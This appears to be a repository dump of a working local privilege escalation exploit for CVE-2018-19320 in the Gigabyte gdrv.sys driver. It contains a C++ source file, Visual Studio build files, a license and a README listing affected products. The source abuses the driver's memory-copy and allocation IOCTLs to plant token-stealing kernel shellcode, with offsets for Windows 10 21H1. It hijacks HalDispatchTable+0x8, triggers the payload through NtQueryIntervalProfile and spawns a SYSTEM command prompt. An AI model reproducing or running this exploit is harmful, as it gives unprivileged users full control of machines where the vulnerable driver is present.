Project Path: arc_gmh5225_CVE-2018-19320-LPE_f2oadrv0

Source Tree:

```txt
arc_gmh5225_CVE-2018-19320-LPE_f2oadrv0
├── CVE-2018-19320-LPE-Exploit
│   ├── CVE-2018-19320-LPE-Exploit
│   │   ├── CVE-2018-19320-LPE-Exploit.cpp
│   │   ├── CVE-2018-19320-LPE-Exploit.vcxproj
│   │   ├── CVE-2018-19320-LPE-Exploit.vcxproj.filters
│   │   └── CVE-2018-19320-LPE-Exploit.vcxproj.user
│   ├── CVE-2018-19320-LPE-Exploit.sln
│   └── x64
│       └── CVE-2018-19320-LPE-Exploit.exe
├── LICENSE
├── README.md
└── img
    └── image-20210819200340188.png

```

`CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30204.135
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CVE-2018-19320-LPE-Exploit", "CVE-2018-19320-LPE-Exploit\CVE-2018-19320-LPE-Exploit.vcxproj", "{18A07ADD-2E0C-44AD-AA92-6B44781444FD}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Debug|x64.ActiveCfg = Debug|x64
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Debug|x64.Build.0 = Debug|x64
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Debug|x86.ActiveCfg = Debug|Win32
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Debug|x86.Build.0 = Debug|Win32
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Release|x64.ActiveCfg = Release|x64
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Release|x64.Build.0 = Release|x64
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Release|x86.ActiveCfg = Release|Win32
		{18A07ADD-2E0C-44AD-AA92-6B44781444FD}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {0796D6EE-EF86-441B-BE37-CE6DC3188460}
	EndGlobalSection
EndGlobal

```

`CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit.cpp`:

```cpp
// Date: 2021-08-18
// CVE-2018-19320 LPE exploit
// Author: @hmsec
// Discovered by: Diego Juarez
// Tested on: Windows 10 x64 21H1(OS Build 1903.1165)

#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <string.h>

typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval);

_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");

typedef struct _gio_memcpy_struct {
	LPVOID dest;
	LPVOID src;
	DWORD size;
} gio_memcpy_struct;


HANDLE hDriver;
HANDLE open_driver() {
	hDriver = CreateFileA("\\\\.\\GIO", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open a handle to target driver.");
		exit(0);
		return FALSE;
	}
	return hDriver;
}

BOOL gio_memcpy(LPVOID dest, LPVOID src, DWORD size)
{
	gio_memcpy_struct arg_struct = { dest, src, size };

	BYTE out_buffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(hDriver, 0xC3502808, (LPVOID)&arg_struct, sizeof(arg_struct), (LPVOID)out_buffer, sizeof(out_buffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}


ULONG64 gio_memory_allocate(UINT64 buffer_len) {

	ULONG64 out_buffer[2] = { 0 };

	DeviceIoControl(hDriver, 0xC3502800, (LPVOID)&buffer_len, sizeof(buffer_len), (LPVOID)out_buffer, sizeof(out_buffer), NULL, NULL);
	return out_buffer[0];
}


LPVOID get_kernel_base_address()
{
	LPVOID image_base_addresses_array[1024];
	DWORD lpcbNeeded;

	BOOL base_eunm = EnumDeviceDrivers(image_base_addresses_array, sizeof(image_base_addresses_array), &lpcbNeeded);

	if (base_eunm == 0)
	{
		printf("[-] EnumDeviceDrivers Failed %d\n", GetLastError());
		exit(1);
	}

	// the kernel base address is the first address in the returned array.
	LPVOID kerne_base_address = image_base_addresses_array[0];
	return kerne_base_address;
}


// --- Token stealing Shellcode (Windows 10 x64 21H1) --- 
/*
	offsets:
	0x188     --> KPCR.Prcb.CurrentThread(_ETHREAD)
	0xB8      --> ETHREAD.Tcb.ApcState.Process(_EPROCSS)
	0x448     --> EPROCESS.ActiveProcessLink
	0x440     --> EPROCESS.pid
	0x4b8     --> EPROCESS.Token
*/

char shellcode[] =
"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"      // mov rax,gs:[0x188]     --> Get the current _ETHREAD
"\x48\x8b\x80\xb8\x00\x00\x00"				// mov rax, [rax+0xB8]    --> Get the _EPROCESS of the current process
"\x48\x89\xc1"								// mov rcx, rax           --> Backup the EPROCESS of the current process to rcx

"\x48\x8b\x80\x48\x04\x00\x00"				// mov rax,[rax+0x448]    --> Get `_EPROCESS.ActiveProcessLink` to iterate over the `_EPROCESS` struct of the running process
"\x48\x2d\x48\x04\x00\x00"					// sub rax, 448h          --> Go back to to the top of `_EPROCESS` (_EPROCESS+0x00)
"\x4c\x8b\x88\x40\x04\x00\x00"				// mov r9,[rax+0x440]     --> Get `EPROCESS.pid` 
"\x49\x83\xf9\x04"							// cmp r9, 4              --> compare if the pid equall 4 (system.exe pid)

"\x75\xe6"									// jne 0x18               --> if not, jump back the first instrcuction of loop (Until system.exe pid is found)

"\x48\x8b\x90\xb8\x04\x00\x00"				// mov rdx,[rax+0x4B8]    --> Move "System.exe" token to `rdx`
"\x48\x89\x91\xb8\x04\x00\x00"				// mov [rcx+0x4B8], rdx   --> Move "System.exe" token to current process's token
"\xc3";										// ret

char* shellcode_raw = shellcode;


int main(void)
{
	// open driver
	hDriver = open_driver();
	printf("[+] CVE-2018-19320 LPE exploit by @hmsec\n");

	// --- 1. Get kernel base address ---
	LPVOID kerne_base_address = get_kernel_base_address();
	printf("[+] Kernel base address: 0x%llx\n", kerne_base_address);

	// --- 2. Write the shellcode to the memory ---

	// Allocate the memory first
	printf("[+] Writing the shellcode to the memory\n");
	ULONG64 shellcode_address = gio_memory_allocate(sizeof(shellcode));
	printf("[+] shellcode address: 0x%llx\n", shellcode_address);

	// Write the shellcode raw data to `shellcode_address`
	gio_memcpy((LPVOID)shellcode_address, LPVOID(shellcode_raw), sizeof(shellcode));

	// --- 3. Get HalDispatchTable+0x8 adddress --- 

	char kernel_base_name[] = "ntoskrnl.exe";
	// Get `HalDispatchTable` in user mode
	HMODULE ntkrnll_handle = LoadLibraryA(kernel_base_name);
	LPVOID HalDispatchTable_user_address = (LPVOID)GetProcAddress(ntkrnll_handle, "HalDispatchTable");
	// printf("HalDispatchTable_user_address: 0x%llx\n", HalDispatchTable_user_address);

	// Note: `ntkrnl!HalDispatchTable` offset is the same both in user and kernel spaces
	LPVOID HalDispatchTable_offset = (LPVOID)((ULONG64)HalDispatchTable_user_address - (ULONG64)ntkrnll_handle);
	// printf("HalDispatchTable_offset: 0x%llx\n", HalDispatchTable_offset);

	LPVOID HalDispatchTable_kernel_address = (LPVOID)((ULONG64)HalDispatchTable_offset + (ULONG64)kerne_base_address);

	LPVOID HalDispatchTable_8 = (LPVOID)((ULONG64)HalDispatchTable_kernel_address + 8);
	printf("[+] HalDispatchTable+0x8 address: 0x%llx\n", HalDispatchTable_8);


	// --- 4. Overwrite HalDispatchTable+0x8 with shellcode address ---

	// Get the original HalDispatchTable + 0x8 first so we can restore it later
	PULONG64 HalDispatchTable_8_original_value;
	gio_memcpy(&HalDispatchTable_8_original_value, HalDispatchTable_8, 8);
	printf("[+] HalDispatchTable+0x8 original value: 0x%llx\n", HalDispatchTable_8_original_value);


	// Overwrite the shellcode_address to HalDispatchTable+0x8
	printf("[+] Overwriting HalDispatchTable+0x8 with shellcode address\n");
	gio_memcpy(HalDispatchTable_8, LPVOID(&shellcode_address), 8);

	// --- 5. Call NtQueryIntervalProfile to execute the shellcode (stored in HalDispatchTable+0x8)  ---
	printf("[+] Calling NtQueryIntervalProfile to execute the shellcode\n");
	ULONG temp;
	NtQueryIntervalProfile(0x10, &temp);

	// --- 6. Restore the original pointer of "HalDispatchTable+0x8" to avoid BSOD --
	printf("[+] Restoring the original value of HalDispatchTable+0x8 to avoid BSOD\n");
	gio_memcpy(HalDispatchTable_8, LPVOID(&HalDispatchTable_8_original_value), 8);

	printf("[+] Lauching cmd.exe \n");
	system("start cmd.exe");

	// Cleanup 
	CloseHandle(hDriver);

	return 0;
}

```

`CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{18a07add-2e0c-44ad-aa92-6b44781444fd}</ProjectGuid>
    <RootNamespace>CVE201819320LPEExploit</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="CVE-2018-19320-LPE-Exploit.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="CVE-2018-19320-LPE-Exploit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit/CVE-2018-19320-LPE-Exploit.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`LICENSE`:

```
MIT License

Copyright (c) 2021 hmsec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# CVE-2018-19320 LPE Exploit

## Description

Local Privilege Escalation Exploit of CVE-2018-19320. The exploit uses the exposed functions in **gdrv.sys** that allow a low-level user to allocate and write data to memory for escalating the privileges to SYSTEM. 



## ScreenShot

**Tested on:**  Windows 10 x64 21H1 (OS Build 1903.1165)

![image-20210819200340188](img/image-20210819200340188.png)



## Affected Versions

- GIGABYTE APP Center v1.05.21 and previous
- AORUS GRAPHICS ENGINE v1.33 and previous
- XTREME GAMING ENGINE v1.25 and previous
- OC GURU II v2.08



## Credits

The vulnerability was discoverd by Diego Juarez

Adviosry: https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-of-privilege-vulnerabilities/


```